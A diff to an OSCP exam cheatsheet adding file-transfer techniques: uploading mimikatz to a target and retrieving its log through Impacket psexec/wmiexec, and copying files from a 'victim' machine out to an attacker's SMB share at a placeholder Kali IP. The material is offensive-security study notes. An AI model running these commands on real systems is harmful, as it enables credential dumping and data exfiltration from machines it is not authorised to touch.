@@ -1,34 +1,53 @@
 #+TITLE: OSCP Cheatsheet
 #+AUTHOR: Forked by Ethan Lacerenza  Author: Leonardo Tamiano
+* Transfer file via Impacket tools:
 
-* Transfer file via SMB 
+psexec and wmiexec are shipped with built in feature for file transfer.
+Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
+Uploading mimikatz.exe to the target machine:
 #+begin_example
+C:\Windows\system32> lput mimikatz.exe
+[*] Uploading mimikatz.exe to ADMIN$\/
+C:\Windows\system32> cd C:\windows
+C:\Windows> dir /b mimikatz.exe
+mimikatz.exe
+  #+end_example
+Downloading mimikatz.log:
+#+begin_example
+
+C:\Windows> lget mimikatz.log
+[*] Downloading ADMIN$\mimikatz.log
+  #+end_example
+* Transfer file via SMB 
+
 Make a smb share 
+#+begin_example
 ----------------------
 from your kali
 -----------------------------
-`impacket-smbserver -smb2support <share_name> <path>`
+impacket-smbserver -smb2support <share_name> <path>
 eg,
-`impacket-smbserver -smb2support test .`
+impacket-smbserver -smb2support test .
 --------------------------------------------------
 then from victim,
-`net use \\<kali_ip>\test`
+net use \\<kali_ip>\test
 
 then
-`PS> cp filename.txt \\kali_ip\test\`
+PS> cp filename.txt \\kali_ip\test\
 or
-`CMD > copy filename.txt \\kali_ip\test\`
-------------------
--------------------
+CMD > copy filename.txt \\kali_ip\test\
+ #+end_example
+
 if got error, try to make a share from your kali with username password
-`impacket-smbserver -smb2support test . -username df -password df`
- 
+ #+begin_example
+impacket-smbserver -smb2support test . -username df -password df
+
 then from victim
-`net use \\kali_ip\test /u:df df`
+net use \\kali_ip\test /u:df df
 then
-`PS> cp filename.txt \\kali_ip\test\`
+PS> cp filename.txt \\kali_ip\test\
 or
-`CMD > copy filename.txt \\kali_ip\test\`
+CMD > copy filename.txt \\kali_ip\test\
   #+end_example
 * MSFVenom
   
